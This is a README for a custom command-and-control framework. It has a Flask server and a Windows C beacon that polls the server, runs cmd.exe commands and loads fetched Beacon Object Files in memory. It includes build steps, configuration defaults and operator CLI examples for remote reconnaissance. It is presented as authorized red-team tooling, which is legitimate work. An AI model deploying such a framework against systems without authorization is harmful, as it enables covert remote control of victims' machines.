# C&C — Command & Control Framework

A lightweight, custom C2 framework built for educational and authorized red-team use. Consists of a Python-based server and a Windows beacon agent written in C, with support for Beacon Object Files (BOFs) executed in-process.

---

## How It Works

**Communication** is HTTP over port `8080`. All traffic is encrypted with **ChaCha20-Poly1305 AEAD** using a per-session 32-byte key derived via ECDH. The agent performs a secure key exchange on `/register`, then encrypts all later traffic with the negotiated session key.

**Agent lifecycle:**

1. Beacon registers (`POST /register`) — server issues a UUID agent ID.
2. Beacon polls (`POST /checkin/<id>`) on a jittered sleep (default 5s ± 3s), sending any buffered output and receiving the next command.
3. Commands are either shell strings (run via `cmd.exe /c`) or `BOF:<name>:<hex-args>` directives.
4. For BOF commands, the beacon fetches the `.obj` from `GET /getbof/<id>/<name>`, then loads and executes it in-process via `COFFLoader`.

**BOFs** (Beacon Object Files) are position-independent COFF objects that run inside the beacon's process without spawning a new process. They use a Cobalt Strike–compatible API shim (`beacon_compatibility.c`) for portability.

---

## Requirements

### Server
- Python 3.x
- Flask (`pip install flask`)

### Agent (build)
- Windows host or Linux with MinGW-w64
- `x86_64-w64-mingw32-gcc` on PATH

---

## Building

From the `agent/` directory, run the build script:

```bat
build.bat
```

This will:
1. Compile `beacon.c`, `beacon_compatibility.c`, and `COFFLoader.c`
2. Compile all BOFs in `bofs/*.c`
3. Link `beacon.exe`
4. Copy compiled `.obj` BOFs to `server/bofs/`

**Output:**
- `agent/build/beacon.exe` — the agent binary
- `agent/build/bofs/*.obj` — compiled BOF modules
- `server/bofs/*.obj` — BOFs ready to serve

### Configuration

The agent uses compile-time configuration in `agent/include/config.h`. Unless you override values with `build.bat` arguments, the defaults are:

```c
#define C2_SERVER_IP      "127.0.0.1"
#define C2_SERVER_PORT    8080
#define C2_USER_AGENT     "Mozilla/5.0"
#define C2_SLEEP_BASE_MS  5000
#define C2_SLEEP_JITTER_MS 3000
#define C2_AUTH_TOKEN     ""
```

To override values at build time, run `agent\build.bat` with optional arguments:

```bat
build.bat <server_ip> <server_port> <user_agent> <auth_token> <sleep_base_ms> <sleep_jitter_ms>
```

For example:

```bat
build.bat 10.0.0.1 8080 "Mozilla/5.0" MyToken123 5000 3000
```

If `C2_AUTH_TOKEN` is set, the beacon sends `X-C2-Token` with `/register` and the server validates it before registering a new agent.

---

## Running the Server

```bash
cd server
python c2server.py
```

The server starts Flask on `0.0.0.0:8080`, restores any previously saved agent state from `agents.json`, and drops into an interactive CLI:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  C2 SERVER
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

 12:00:00  OK    listening    0.0.0.0:8080
 12:00:00  OK    bof dir      /path/to/server/bofs
 12:00:00  OK    upload dir   /path/to/server/uploads
 12:00:00  OK    restored    <n> agent(s) from agents.json

 >
```

If you want the server to require agent registration authentication, set the `C2_AUTH_TOKEN` environment variable before running:

```bat
set C2_AUTH_TOKEN=MyToken123
python c2server.py
```

---

## CLI Reference

### Global Commands

| Command       | Description                        |
|---------------|------------------------------------|
| `list`        | List all registered agents         |
| `bofs`        | List available BOF modules         |
| `use <id>`    | Select an agent (partial ID OK)    |
| `clear`       | Clear the terminal                 |
| `help`        | Show command reference             |
| `exit`        | Shut down the server               |

### Agent Commands (after `use <id>`)

| Command            | Description                              |
|--------------------|------------------------------------------|
| `shell <cmd>`      | Execute a shell command on the agent     |
| `bof <name> [args]`| Execute a BOF module with optional args  |
| `output [n]`       | Show last N command outputs (default 10) |
| `info`             | Show agent details                       |
| `stats`            | Show session statistics                  |
| `back`             | Deselect the current agent               |

### BOF Argument Types

Arguments to `bof` are space-separated and type-prefixed:

| Prefix | Type              | Example          |
|--------|-------------------|------------------|
| `s:`   | UTF-8 string      | `s:C:\Windows`   |
| `w:`   | UTF-16LE string   | `w:Administrator`|
| `i:`   | 32-bit integer    | `i:1337`         |
| `h:`   | 16-bit short      | `h:80`           |
| *(none)*| String (default) | `hostname`       |

---

## Included BOF Modules

| Module            | Description                                      |
|-------------------|--------------------------------------------------|
| `whoami`          | Current user, domain, SID, elevation, and integrity level |
| `pslist`          | Running process list (PID, PPID, threads, name)  |
| `arp_cache`       | ARP table entries                                |
| `dirlist`         | Directory listing                                |
| `sysinfo`         | System and OS information                        |
| `tcp_connections` | Active TCP connections                           |

### Example Usage

```
 > use abc123
 > shell whoami
 > shell dir C:\Users
 > bof pslist
 > bof whoami
 > bof dirlist s:C:\Users\Administrator\Documents
 > output 5
 > stats
 > back
```

---

